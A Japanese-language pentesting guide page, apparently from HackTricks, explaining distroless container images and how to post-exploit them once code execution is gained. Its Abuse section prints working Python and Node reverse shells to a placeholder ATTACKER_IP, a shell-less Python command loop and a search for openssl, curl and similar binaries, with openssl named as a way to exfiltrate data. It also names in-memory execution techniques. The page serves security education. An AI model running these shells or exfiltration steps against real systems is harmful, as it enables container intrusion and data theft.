# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Overview

**distroless** container image は、**特定の1つの application を実行するために必要な最小限の runtime component**だけを含み、package manager、shell、大規模な汎用 userland utility など、通常の distribution tooling を意図的に削除した image です。実際には、distroless image には application binary または runtime、shared library、certificate bundle、そして非常に小さな filesystem layout だけが含まれていることがよくあります。

重要なのは、distroless が新しい kernel isolation primitive だということではありません。Distroless は**image design strategy**です。container filesystem の**内部で**利用できるものを変えるのであって、kernel が container をどのように isolate するかを変えるものではありません。この違いは重要です。distroless は、主に code execution を得た後に attacker が利用できるものを減らすことで environment を harden します。namespaces、seccomp、capabilities、AppArmor、SELinux、その他の runtime isolation mechanism の代替にはなりません。

## Why Distroless Exists

Distroless image は主に、以下を削減するために使用されます。

- image size
- image の operational complexity
- vulnerability を含む可能性のある package と binary の数
- attacker が default で利用できる post-exploitation tool の数

そのため、distroless image は production application deployment で人気があります。shell、package manager、そしてほとんど汎用 tooling を含まない container は、通常、運用上の判断が容易で、compromise 後に interactive に悪用することも困難です。

よく知られている distroless-style image family の例は以下のとおりです。

- Google's distroless image
- Chainguard hardened/minimal image

## What Distroless Does Not Mean

distroless container は以下を意味するものでは**ありません**。

- 自動的に rootless になる
- 自動的に non-privileged になる
- 自動的に read-only になる
- 自動的に seccomp、AppArmor、SELinux によって保護される
- 自動的に container escape から安全になる

distroless image を `--privileged`、host namespace sharing、危険な bind mount、または mount された runtime socket とともに実行することは依然として可能です。その状況では、image が minimal であっても、container は依然として壊滅的に insecure になり得ます。Distroless が変えるのは**userland attack surface**であり、**kernel trust boundary**ではありません。

## Typical Operational Characteristics

distroless container を compromise した場合、最初に気付くのは、一般的な前提が通用しなくなっていることです。`sh`、`bash`、`ls`、`id`、`cat` が存在しない場合があり、通常の tradecraft が想定するような libc-based environment さえ存在しないことがあります。これは offense と defense の両方に影響します。tooling がないことで、debugging、incident response、post-exploitation の方法が変わるためです。

最も一般的な pattern は以下のとおりです。

- application runtime は存在するが、それ以外はほとんど存在しない
- shell が存在しないため、shell-based payload は失敗する
- helper binary が存在しないため、一般的な enumeration one-liner は失敗する
- read-only rootfs や、writable tmpfs location 上の `noexec` など、filesystem protection も併用されていることが多い

この組み合わせが、通常「weaponizing distroless」について語られる理由です。

## Distroless And Post-Exploitation

distroless environment における主な offensive challenge は、必ずしも最初の RCE ではありません。多くの場合、その後に何をするかが challenge になります。exploit した workload が Python、Node.js、Java、Go などの language runtime で code execution を提供する場合、arbitrary logic を実行できる可能性はあります。しかし、他の Linux target で一般的な、通常の shell-centric workflow を利用できるとは限りません。

そのため、post-exploitation は多くの場合、以下の3方向のいずれかに移行します。

1. **既存の language runtime を直接使用して** environment の enumerate、socket の open、file の read、追加 payload の stage を行う。
2. filesystem が read-only である場合や、writable location が `noexec` として mount されている場合に、**独自の tooling を memory に持ち込む**。
3. application またはその dependency に、予想外に有用なものが含まれている場合、**image 内にすでに存在する binary を悪用する**。

## Abuse

### Enumerate The Runtime You Already Have

多くの distroless container には shell がありませんが、application runtime は存在します。target が Python service なら Python が存在し、Node.js が target なら Node が存在します。これにより、`/bin/sh` を一度も invoke せずに、file の enumerate、environment variable の read、reverse shell の open、in-memory execution の stage まで行えるだけの機能を得られることがよくあります。

Python を使用した簡単な例:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Node.jsによる簡単な例：
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impact:

- 環境変数の取得（認証情報や service endpoint が含まれていることが多い）
- `/bin/ls` なしでの filesystem enumeration
- 書き込み可能なパスと mount 済み secrets の特定

### `/bin/sh` なしの Reverse Shell

image に `sh` や `bash` が含まれていない場合、classic な shell-based reverse shell は直ちに失敗する可能性があります。その場合は、インストール済みの language runtime を使用します。

Python reverse shell：
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
`/bin/sh` が存在しない場合は、最後の行を Python による直接的なコマンド実行、または Python REPL ループに置き換えます。

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
繰り返しになりますが、`/bin/sh` が存在しない場合は、shell を spawn する代わりに Node の filesystem、process、networking API を直接使用してください。

### Full Example: No-Shell Python Command Loop

イメージに Python はあっても shell がまったくない場合、シンプルな対話型ループだけで、完全な post-exploitation capability を維持できることがよくあります。
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
これはインタラクティブな shell binary を必要としません。攻撃者の観点では、その影響は基本的な shell と実質的に同じです。つまり、既存の runtime を介した command execution、enumeration、追加 payload の staging が可能です。

### メモリ上での Tool Execution

Distroless images は、次の設定と組み合わせて使用されることがよくあります。

- `readOnlyRootFilesystem: true`
- `/dev/shm` などの writable だが `noexec` な tmpfs
- package management tools の不足

この組み合わせにより、「binary を disk に download して実行する」という従来の workflow は信頼性が低くなります。そのような場合、memory execution techniques が主な選択肢になります。

専用ページはこちらです。

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

そこで特に関連性の高い techniques は次のとおりです。

- scripting runtimes 経由の `memfd_create` + `execve`
- DDexec / EverythingExec
- memexec
- memdlopen

### Image 内にすでに存在する Binaries

一部の Distroless images には、運用上必要な binaries が含まれており、compromise 後に有用になる場合があります。繰り返し確認されている例として `openssl` があります。applications が crypto や TLS 関連の tasks で必要とすることがあるためです。

簡単な検索 pattern は次のとおりです。
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
`openssl` が存在する場合、以下に利用できる可能性があります。

- outbound TLS connections
- 許可された egress channel 経由での data exfiltration
- encoded/encrypted blobs を介した payload data の staging

正確な abuse の内容は実際に何がインストールされているかによって異なりますが、一般的な考え方として、distroless は「ツールがまったくない」という意味ではなく、「通常の distribution image よりもはるかに少ないツールしかない」という意味です。

## Checks

これらの checks の目的は、実際にその image が distroless なのか、また post-exploitation に利用できる runtime や helper binaries が残っているかを確認することです。
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
ここで注目すべき点:

- shell が存在しなくても、Python や Node などの runtime が存在する場合、post-exploitation は runtime ベースの execution に pivot すべきです。
- root filesystem が read-only で、`/dev/shm` は writable だが `noexec` の場合、memory execution techniques の重要性がさらに高まります。
- `openssl`、`busybox`、`java` などの補助 binary が存在する場合、それらはさらなる access を bootstrap するのに十分な機能を提供する可能性があります。

## Runtime のデフォルト

| Image / platform の種類 | デフォルト状態 | 典型的な挙動 | よくある手動での弱体化 |
| --- | --- | --- | --- |
| Google distroless style images | 設計上 userland は最小限 | shell も package manager もなく、application/runtime の dependencies のみ | debugging layers、sidecar shells、busybox や tooling のコピーを追加 |
| Chainguard minimal images | 設計上 userland は最小限 | package surface を削減し、多くの場合は1つの runtime または service に集中 | `:latest-dev` や debug variants の使用、build 中に tools をコピー |
| distroless images を使用する Kubernetes workloads | Pod config に依存 | Distroless が影響するのは userland のみ。Pod の security posture は Pod spec と runtime のデフォルトにも依存 | ephemeral debug containers、host mounts、privileged Pod settings の追加 |
| distroless images を実行する Docker / Podman | run flags に依存 | filesystem は最小限だが、runtime security は flags と daemon configuration にも依存 | `--privileged`、host namespace sharing、runtime socket mounts、writable host binds |

重要な点は、distroless は **image の property** であり、runtime の protection ではないということです。その価値は、compromise 後に filesystem 内で利用できるものを削減することにあります。

## 関連ページ

distroless environments で一般的に必要となる filesystem および memory-execution bypasses について:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

distroless workloads にも適用される container runtime、socket、mount の abuse について:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

{{#include ../../../banners/hacktricks-training.md}}
